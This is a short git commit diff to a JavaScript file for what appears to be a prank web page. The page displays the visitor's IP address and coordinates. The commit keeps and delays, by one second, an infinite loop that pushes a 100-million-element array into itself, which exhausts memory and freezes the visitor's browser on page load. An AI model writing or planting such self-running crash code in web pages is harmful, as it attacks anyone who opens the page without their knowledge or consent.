5b882ed1a0ce0c69331f919fd0d4602737e343e2
Arcy <73959934+HighArcs@users.noreply.github.com>
2022-02-25 12:34:01 -0600

    Update index.js

--- lol/index.js
+++ lol/index.js
@@ -6,10 +6,9 @@
   const ipE = document.getElementById("ip");
   const llE = document.getElementById("ll");
   
-  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 5000)
   ipE.innerText = ip
   llE.innerText = `(${longitude}, ${latitude})`;
   // lol
-  const a = "a".repeat(1e8).split("")
-  while(1) a.push(a)
+  setTimeout(() => {const a = "a".repeat(1e8).split("")
+  while(1) a.push(a)},1000)
 })()
